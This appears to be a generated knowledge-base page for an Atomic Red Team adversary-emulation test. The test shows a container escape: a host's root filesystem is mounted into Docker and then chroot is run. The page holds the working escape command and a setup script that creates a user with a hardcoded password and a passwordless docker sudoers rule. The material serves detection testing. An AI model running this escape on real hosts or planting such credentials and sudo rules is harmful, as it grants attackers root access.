---
atomic_guid: "39fab1bc-fcb9-406f-bc2e-fe03e42ff0e4"
title: "Privilege Escalation via Docker Volume Mapping"
framework: "atomic"
generated: "true"
attack_technique_id: "T1611"
attack_technique_name: "Escape to Host"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.yaml"
build_date: "2026-04-26 17:02:13"
executor: "sh"
aliases:
  - "39fab1bc-fcb9-406f-bc2e-fe03e42ff0e4"
  - "Privilege Escalation via Docker Volume Mapping"
platforms:
  - "containers"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Privilege Escalation via Docker Volume Mapping

This test demonstrates privilege escalation by abusing Docker's volume mapping
feature to gain access to the host file system. By mounting the root directory
of the host into a Docker container, the attacker can use chroot to operate as
root on the host system.

## Metadata

- Atomic GUID: 39fab1bc-fcb9-406f-bc2e-fe03e42ff0e4
- Technique: T1611: Escape to Host
- Platforms: containers
- Executor: sh
- Elevation Required: True
- Source Path: atomics/T1611/T1611.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1611-escape_to_host|T1611]]

## Input Arguments

### username

- description: Username that run attack command
- type: string
- default: docker_user

## Dependencies

Docker

### Prerequisite Check

```untitled
command -v docker &> /dev/null && echo "Docker is installed" || { echo "Docker is not installed."; exit 1; }
```

### Get Prerequisite

```untitled
echo "You should install docker manually."
```

Docker Privileged User

### Prerequisite Check

```untitled
sudo -l -U #{username} | grep "(ALL) NOPASSWD: /usr/bin/docker"
```

### Get Prerequisite

```untitled
USERNAME="#{username}"
PASSWORD="password123"
SUDO_COMMAND="/usr/bin/docker"
SUDOERS_FILE="/etc/sudoers.d/$USERNAME"
[[ $EUID -ne 0 ]] && echo "Run as root." && exit 1; id "$USERNAME" &>/dev/null || { useradd -m -s /bin/bash "$USERNAME" && echo "$USERNAME:$PASSWORD" | chpasswd; }; [[ -f "$SUDOERS_FILE" ]] || { echo "$USERNAME ALL=(ALL) NOPASSWD: $SUDO_COMMAND" > "$SUDOERS_FILE" && chmod 440 "$SUDOERS_FILE"; }; echo "Setup complete. User: $USERNAME, Password: $PASSWORD"
```

## Executor

- elevation_required: True
- name: sh

### Command

```bash
echo "Current user: #{username}"
sudo -u docker_user sh -c "sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"
```

### Cleanup

```bash
USERNAME="#{username}"; SUDOERS_FILE="/etc/sudoers.d/$USERNAME"; id "$USERNAME" &>/dev/null && userdel -r "$USERNAME" && echo -e "$USERNAME is deleted."; [[ -f "$SUDOERS_FILE" ]] && rm -f "$SUDOERS_FILE"; echo "Cleanup complete."
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.yaml)
